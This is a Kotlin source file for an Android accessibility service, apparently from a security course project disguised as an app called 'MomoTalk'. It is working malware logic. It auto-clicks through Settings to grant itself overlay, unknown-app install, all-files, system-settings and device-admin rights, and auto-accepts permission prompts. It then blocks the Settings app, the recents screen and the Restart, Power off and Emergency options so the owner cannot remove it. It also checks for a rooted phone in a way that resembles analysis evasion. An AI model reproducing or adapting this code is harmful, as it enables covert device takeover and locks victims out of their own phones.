package com.example.ict2215_project.services

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Switch
import android.provider.Settings
import android.content.Context
import android.content.Intent
import android.net.wifi.WifiManager

import android.util.Log

import android.accessibilityservice.GestureDescription
import android.graphics.Path
import android.os.Handler
import android.util.DisplayMetrics
import android.content.SharedPreferences
import androidx.activity.result.ActivityResult
import androidx.activity.result.ActivityResultLauncher

import android.graphics.PixelFormat
import android.view.View
import android.view.WindowManager
import android.widget.Button
import android.view.LayoutInflater
import com.example.ict2215_project.R
import android.app.admin.DevicePolicyManager
import com.example.ict2215_project.services.MyDeviceAdminReceiver
import android.content.ComponentName
import java.io.File
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.os.Build
import androidx.core.app.NotificationCompat
import kotlin.system.exitProcess

class CustomAccessibilityService : AccessibilityService() {
    // private val DENY_BUTTON = "com.android.packageinstaller:id/permission_deny_button"
    // private val ALLOW_BUTTON = "com.android.packageinstaller:id/permission_allow_button"
    private val SETTINGS_PACKAGE = "com.android.settings"
    private val RECENTS_PACKAGE = "com.android.systemui"
    private val ACTIVATE_ADMIN = "com.android.settings:id/action_button"
    private val ADMIN_BUTTON = "com.android.settings:id/restricted_action"
    private val APP_LIST = "com.android.settings:id/apps_list"
    private val RECYCLER_VIEW = "androidx.recyclerview.widget.RecyclerView"
    private val TEXT_VIEW = "android.widget.TextView"
    private val LINEAR_LAYOUT = "android.widget.LinearLayout"
    private val TITLE_VIEW = "android.widget.TextView"
    private val BACK_BUTTON_WIDGET = "android.widget.ImageButton"
    private val BUTTON_WIDGET = "android.widget.Button"
    private val ALLOW_BUTTON = "com.android.permissioncontroller:id/permission_allow_button"
    private val NORMAL_BUTTON = "com.android.permissioncontroller:id/permission_allow_foreground_only_button"
    private val NORMAL_ALLOW_ONCE = "com.android.permissioncontroller:id/permission_allow_one_time_button"
    private val NORMAL_MESSAGE = "com.android.permissioncontroller:id/permission_message"
    private val ACTION_BAR = "com.android.settings:id/action_bar"
    private val AUTO_CLICK = AccessibilityNodeInfo.ACTION_CLICK
    private val APP_NAME = "MomoTalk" // to modify when porting over
    private val INSTALL_TITLE = "Install unknown apps"
    private val OVERLAY_TITLE = "Display over other apps"
    private val STORAGE_TITLE = "All files access"
    private val SYSTEM_TITLE = "Modify system settings"
    private val WIDGET_FRAME = "android:id/widget_frame"

    // maintain state of certain variables
    private val PREFERENCE_FILE_KEY = "app"
    private val sharedPreferences: SharedPreferences by lazy {
        getSharedPreferences(PREFERENCE_FILE_KEY, Context.MODE_PRIVATE)
    }

    object PreferenceKeys {
        const val OVERLAY_STATUS = "overlayStatus"
        const val SYSTEM_STATUS = "systemStatus"
        const val INSTALL_STATUS = "installStatus"
        const val STORAGE_STATUS = "storageStatus"
        const val ADMIN_STATUS = "adminStatus"
        const val NORMAL_STATUS = "normalStatus"
        const val FINAL_STATUS = "finalStatus"
    }


    // set I/O preferences keys
    private fun persistBoolean(key: String, value: Boolean) {
        with(sharedPreferences.edit()) {
            putBoolean(key, value)
            apply()
        }
    }

    private fun getPersistedboolean(key: String, defaultValue: Boolean = false): Boolean {
        return sharedPreferences.getBoolean(key, defaultValue)
    }

    override fun onInterrupt() {}

    override fun onAccessibilityEvent(accessibilityEvent: AccessibilityEvent?) {
        var overlayStatusCheck = getPersistedboolean(PreferenceKeys.OVERLAY_STATUS)
        var installStatusCheck = getPersistedboolean(PreferenceKeys.INSTALL_STATUS)
        var systemStatusCheck = getPersistedboolean(PreferenceKeys.SYSTEM_STATUS)
        var adminStatusCheck = getPersistedboolean(PreferenceKeys.ADMIN_STATUS)
        var storageStatusCheck = getPersistedboolean(PreferenceKeys.STORAGE_STATUS)
        var normalStatusCheck = getPersistedboolean(PreferenceKeys.NORMAL_STATUS)
        var finalStatusCheck = getPersistedboolean(PreferenceKeys.FINAL_STATUS)
        Log.d("eventor", accessibilityEvent?.source.toString()?:"nothing")

        checkRootAndCloseApp(this)

        // if (Settings.canDrawOverlays(this)) {
        //     Log.d("resumer", "im here")
        // }

        // Allow normal permissions event handler
        if (accessibilityEvent?.packageName == "com.google.android.permissioncontroller") {
            var source = accessibilityEvent?.source
            if (source != null) {
                setNormal(source)
            } else {
                // because after activating normal permissions, the next few events are null
                // if null, it means full permission granted and we can lock them out of settings app
                val dmp = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
                val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
                if (getPersistedboolean(PreferenceKeys.ADMIN_STATUS) || dmp.isAdminActive(componentName)) {
                    persistBoolean(PreferenceKeys.FINAL_STATUS, true)
                }
            }
        }

        // another blocker to prevent users from closing the application and shutting down the phone
        if (getPersistedboolean(PreferenceKeys.FINAL_STATUS)) {
            var info = accessibilityEvent?.source
            // if (info?.packageName == RECENTS_PACKAGE  ) {
            if (info?.packageName == RECENTS_PACKAGE && info?.contentDescription == "Overview") {
                performGlobalAction(GLOBAL_ACTION_BACK)
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
            var resetter = info?.findAccessibilityNodeInfosByViewId("android:id/message")
            if (resetter != null) {
                for (i in 0 until resetter.size) {
                    var resetNode = resetter[i]
                    if (resetNode.text == "Restart" || resetNode.text == "Power off" || resetNode.text == "Emergency") {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                        performGlobalAction(GLOBAL_ACTION_HOME)
                    }
                }
            }

        }


        // Last permission to enable is admin/normal permissions
        if (accessibilityEvent?.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        || accessibilityEvent?.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
       


            val info = accessibilityEvent?.source

            if (!getPersistedboolean(PreferenceKeys.FINAL_STATUS)) {
                info?.let {
                    if (info.packageName != "com.google.android.apps.nexuslauncher" && info.packageName != RECENTS_PACKAGE) {
                        if (!overlayStatusCheck) {
                            setOverlay()
                        }
                        if (!installStatusCheck) {
                        // if (overlayStatusCheck && !installStatusCheck) {
                            var overlayList = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(ACTION_BAR)
                            if (overlayList.isNotEmpty()) {
                                var node = overlayList[0]
                                for (i in 0 until node.childCount) {
                                    var child = node.getChild(i)
                                    if (child.className == TEXT_VIEW && child.text == OVERLAY_TITLE) {
                                        backButton(overlayList[0])
                                        setInstallApp()
                                    }
                                }
                            }
                            setInstallApp()
                        }
                        // do not delete this line yet
                        if (!installStatusCheck) {
                            setInstallApp()
                        }
                        if (!systemStatusCheck) {
                            setSystem()
                        }
                        if (!storageStatusCheck) {
                            setStorage()
                        }
                        if (!adminStatusCheck) {
                            setAdmin(info)
                        }
                    }
                }
            } else {
                // constantly deny user settings app access
                if (info?.packageName == SETTINGS_PACKAGE) {
                    performGlobalAction(GLOBAL_ACTION_HOME)
                }
            }
        }
    }

    // Only call this function when in the correct active window
    // Pass in the parent/root node
    private fun backButton(info: AccessibilityNodeInfo): Boolean {
        var list = info
        if (list == null) {
            list = getRootInActiveWindow()
        }
        // Log.d("backer", list.toString())
        for (i in 0 until list.childCount) {
            // Log.d("backerinfo", i.toString() + "\n" + list.getChild(i).toString())
            val node = list.getChild(i)
            if (node.className == BACK_BUTTON_WIDGET && node.contentDescription.contains("Back") && node.isClickable) {
                val result = node.performAction(AUTO_CLICK)?: false
                return result
            }
        }
        return false
    }

    // This will activate to enable admin permissions
    private fun setAdmin(info: AccessibilityNodeInfo): Boolean {
        // val list = info.findAccessibilityNodeInfosByViewId(ACTIVATE_ADMIN)
        val list = info.findAccessibilityNodeInfosByViewId(ADMIN_BUTTON)
        var status = getPersistedboolean(PreferenceKeys.ADMIN_STATUS)
        if (list.isNotEmpty() && !status ) {
            // hardcoded value for faster execution
            val node = list[0]
            if (node != null && node.isClickable) {
                node.performAction(AUTO_CLICK)
            } else {
                var parent = node.parent
                // while (parent != null && !parent.isClickable) {
                //     parent = parent.parent
                // }
                persistBoolean(PreferenceKeys.ADMIN_STATUS, true)
                parent?.performAction(AUTO_CLICK) ?: false
                return true
            }
        }
        return true
    }

    // Enable install unknown apps
    private fun setInstallApp(): Boolean {
        val list = getRootInActiveWindow()
        var installStatus = getPersistedboolean(PreferenceKeys.INSTALL_STATUS)
                        
        if (!installStatus) {
            // Make sure title matches in the correct window
            var titleList = list.findAccessibilityNodeInfosByViewId(ACTION_BAR)
            if (titleList.isNotEmpty()) {
                var header = titleList[0]
                for (i in 0 until header.childCount) {
                    var child = header.getChild(i)
                    if (child.className == TEXT_VIEW && child.text.toString() != INSTALL_TITLE) {
                        return false
                    }
                }
            }



        }

        if (!installStatus) {
            // Hardcode the element numbers to process faster and toggle allow
            var result = list.findAccessibilityNodeInfosByViewId(WIDGET_FRAME)
            var backResult = list.findAccessibilityNodeInfosByViewId(ACTION_BAR)
            Log.d("installerresult", result.toString())
            Log.d("installerback", backResult.toString())

            if (result.isNotEmpty()) {
                var switch = result[0]
                if (switch != null && switch.isClickable) {
                    switch.performAction(AUTO_CLICK)
                    persistBoolean(PreferenceKeys.INSTALL_STATUS, true)
                } else {
                    var parent = switch.parent
                    if (parent.className == LINEAR_LAYOUT && parent.isClickable) {
                        // get parent node of back button
                        // have to call this first otherwise after clicking, window does not go back
                        // i hate event driven architecture
                        if (backResult.isNotEmpty()) {
                            var backNode = backResult[0]
                            backButton(backNode)
                        }
                        parent.performAction(AUTO_CLICK)
 
                    } else {}
                    return true
                }
            }
        }

        return true
    }

    // Go into our application and activate then press back twice
    private fun setOverlay(): Boolean {
        val list = getRootInActiveWindow()
        var overlayStatus = getPersistedboolean(PreferenceKeys.OVERLAY_STATUS)
        Log.d("overlaynode", list.toString()?:"nothing")
                        
        if (!overlayStatus) {
            // Make sure title matches in the correct window
            var titleList = list.findAccessibilityNodeInfosByViewId(ACTION_BAR)
            if (titleList.isNotEmpty()) {
                var header = titleList[0]
                for (i in 0 until header.childCount) {
                    var child = header.getChild(i)
                    if (child.className == TEXT_VIEW && child.text.toString() != OVERLAY_TITLE) {
                        return false
                    }
                }
            }

        }
        if (!overlayStatus) {
            val appList = list.findAccessibilityNodeInfosByViewId(APP_LIST)
            Log.d("overlaylist", appList.toString())
            if (appList.isNotEmpty()) {
                    for (i in 0 until appList[0].childCount) {
                    val child = appList[0].getChild(i)
                    if (child.contentDescription.toString() == APP_NAME && child.isClickable) {
                        child.performAction(AUTO_CLICK)
                    }
                }
            }
        }

        // Used to traverse permission manager page
        // Will not execute when toggle button has been clicked
        if (!overlayStatus) {
             // Hardcode the element numbers to process faster and toggle allow
            var result = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(WIDGET_FRAME)
            Log.d("overlaynode2", result.toString())
            if (result.isNotEmpty()) {
                var switch = result[0]
                if (switch != null && switch.isClickable) {
                    switch.performAction(AUTO_CLICK)
                } else {
                    var parent = switch.parent
                    if (parent.className == LINEAR_LAYOUT && parent.isClickable) {
                        persistBoolean(PreferenceKeys.OVERLAY_STATUS, true)
                        parent.performAction(AUTO_CLICK)
                    } else {
                        while (parent!= null && parent.isClickable && parent.className == LINEAR_LAYOUT) {
                            parent = parent.parent
                        }
                        persistBoolean(PreferenceKeys.OVERLAY_STATUS, true)
                        parent.performAction(AUTO_CLICK)
                    }
                    // get parent node of back button
                    var backResult = list.findAccessibilityNodeInfosByViewId(ACTION_BAR)
                    if (backResult.isNotEmpty()) {
                        var backNode = backResult[0]
                        backButton(backNode)
                    }
                    return true
                }
            } else {}
        }        
        return true
    }


    private fun setNormal(info: AccessibilityNodeInfo?) {
        var list = getRootInActiveWindow()

        var content = list.findAccessibilityNodeInfosByViewId("android:id/content")
        if (content.isNotEmpty()) {
            // Log.d("permbuttoncontent", content.toString())
        }
        // Log.d("permbuttonlist", list.toString())
        var result = list.findAccessibilityNodeInfosByViewId(NORMAL_BUTTON)
        // Log.d("permbuttonresult", result.toString())
        if (result.isNotEmpty()) {
            var node = result[0]
            if (node.isClickable && node.className == BUTTON_WIDGET) {
                node.performAction(AUTO_CLICK)
            }
        } else {
            result = list.findAccessibilityNodeInfosByViewId(NORMAL_ALLOW_ONCE)
            if (result.isNotEmpty()) {
                var node = result[0]
                if (node.isClickable && node.className == BUTTON_WIDGET) {
                    node.performAction(AUTO_CLICK)
                }
            }
        }
        var result2 = list.findAccessibilityNodeInfosByViewId(ALLOW_BUTTON)
        // Log.d("permbuttonresult", result.toString())
        if (result2.isNotEmpty()) {
            var node = result2[0]
            if (node.isClickable && node.className == BUTTON_WIDGET) {
                node.performAction(AUTO_CLICK)
            }
        }
    }

    // Look to improve this function
    // Set to enable modify system access in settings app
    private fun setSystem(): Boolean {
        var list = getRootInActiveWindow()
        list?.let {
            var widgetResult = list.findAccessibilityNodeInfosByViewId(WIDGET_FRAME)
            var titleResult = list.findAccessibilityNodeInfosByViewId(ACTION_BAR)
            var systemStatusCheck = getPersistedboolean(PreferenceKeys.SYSTEM_STATUS)

            if (!systemStatusCheck) {
                if (titleResult.isNotEmpty()) {
                    var node = titleResult[0]
                    for (i in 0 until node.childCount) {
                        var titleNode = node.getChild(i)
                        if (titleNode.className == TEXT_VIEW && titleNode?.text.toString()?:"nothing" != SYSTEM_TITLE) {
                            return false
                        }
                    }
                }

                if (widgetResult.isNotEmpty()) {
                    var node = widgetResult[0]
                    var parent = node.parent
                    if (parent.className == LINEAR_LAYOUT && parent.isClickable) {
                        parent.performAction(AUTO_CLICK)
                    }
                }
                var newList = getRootInActiveWindow()
                newList.let {
                    titleResult = newList.findAccessibilityNodeInfosByViewId(ACTION_BAR)
                    if (titleResult.isNotEmpty()) {
                        var node = titleResult[0]
                        for (i in 0 until node.childCount) {
                            var backNode = node.getChild(i)
                            if (backNode.className == BACK_BUTTON_WIDGET && backNode.contentDescription.contains("Back") && backNode.isClickable) {
                                backNode.performAction(AUTO_CLICK)
                            }
                        }
                    }
                }

            }
        }

        return true
    }

    private fun setStorage(): Boolean {
        var storageStatusCheck = getPersistedboolean(PreferenceKeys.STORAGE_STATUS)

        if (!storageStatusCheck) {
            // check title
            var headerResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(ACTION_BAR)
            if (headerResult.isNotEmpty()) {
                var headerNode = headerResult[0]
                if (headerNode.getChild(1) != null) {
                    var titleNode = headerNode.getChild(1)
                    if (titleNode.className == TEXT_VIEW && titleNode.text.toString()?:"nothing" != STORAGE_TITLE) {
                        // Log.d("storageresult", "returning false")
                        return false
                    }
                } else { return false }
            
            } else { return false }

            // traverse app list
            var appResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(APP_LIST)
            Log.d("storagelist2", appResult.toString())
            if (appResult.isNotEmpty()) {
                var appList = appResult[0]
                if (appList.childCount > 0) {
                    for (i in 0 until appList.childCount) {
                        var childNode = appList.getChild(i)
                        if (childNode.contentDescription == APP_NAME) {
                            childNode.performAction(AUTO_CLICK)
                        }
                    }
                }

            }


            // go back
            var backResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(ACTION_BAR)
            if (backResult.isNotEmpty()) {
                backButton(backResult[0])
            }
            // var backResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(ACTION_BAR)
            // if (backResult.isNotEmpty()) {
            //     var backNode = backResult[0]
            //     Log.d("storageback", backNode.toString()?:"nothing")
            //     if (backNode != null) {
            //         if (backNode.childCount > 0) {
            //             for (i in 0 until backNode.childCount) {
            //                 var child = backNode.getChild(i)
            //                 if (child.className == BACK_BUTTON_WIDGET && child.contentDescription.contains("Back") && child.isClickable) {
            //                     child.performAction(AUTO_CLICK)

            //                 }
            //             }
            //         }
            //     }
            // }


            // press button
            Log.d("storagelisttest", getRootInActiveWindow().toString()?:"nothing")
            var innerAppResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(WIDGET_FRAME)
            Log.d("storagelist3", innerAppResult.toString())
            
            if (innerAppResult.isNotEmpty()) {
                var widgetNode = innerAppResult[0]
                if (widgetNode != null) {
                    var parent = widgetNode.parent
                    if (parent != null && parent.className == LINEAR_LAYOUT && parent.isClickable) {
                        persistBoolean(PreferenceKeys.STORAGE_STATUS, true)
                        parent.performAction(AUTO_CLICK)
                        var backResult = getRootInActiveWindow().findAccessibilityNodeInfosByViewId(ACTION_BAR)
                        if (backResult.isNotEmpty()) {
                            backButton(backResult[0])
                        }
                    }
                }
            }


            
        }
        return true
    }
    private fun isDeviceRooted(): Boolean {
        val rootedPaths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        // Check if any of the root paths exist
        rootedPaths.forEach { path ->
            if (File(path).exists()) return true
        }
        // Check for test-keys which is common in rooted builds
        val buildTags = android.os.Build.TAGS
        return buildTags != null && buildTags.contains("test-keys")
    }

    private fun checkRootAndCloseApp(context: Context) {
        if (isDeviceRooted()) {
            val notificationId = 1
            val notification: Notification = NotificationCompat.Builder(context, "CHANNEL_ID")  
            .setSmallIcon(android.R.drawable.ic_dialog_alert)  
            .setContentTitle("Application closing")  
            .setContentText("Please unroot your phone before continuing")  
            .setAutoCancel(true)  
            .build()

            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager  
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {  
                val channel = NotificationChannel(  
                    "CHANNEL_ID",  
                    "Channel human readable title",  
                    NotificationManager.IMPORTANCE_DEFAULT  
                )  
                notificationManager.createNotificationChannel(channel)  
            }  
            // notificationManager.notify(notificationId, notification)  
            // exitProcess(-1)  
            Log.d("checksu", isDeviceRooted().toString())
        }  
    }

}